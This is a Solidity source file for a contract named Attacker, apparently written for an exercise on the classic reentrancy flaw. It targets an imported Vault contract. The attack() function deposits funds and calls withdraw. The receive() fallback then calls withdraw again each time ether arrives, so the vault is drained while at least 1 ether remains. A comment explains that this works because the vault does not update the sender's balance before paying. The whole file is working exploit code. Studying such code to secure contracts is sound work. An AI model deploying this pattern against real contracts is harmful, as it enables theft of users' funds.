// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./vault.sol";

contract Attacker {
    Vault vault;
    uint256 amount = 1 ether ;

    constructor(Vault _vault) payable {
        vault = Vault(_vault);
    }

    /**
     * @notice trigger withdraw
     */
    function attack() public {
        vault.deposit{value: address(this).balance}();
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }

    /**
     * @notice withdraw call call repeatly but they did not update value = balance[msg.sender].
     * so this function obtain value of ether repeatly.
     */
    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}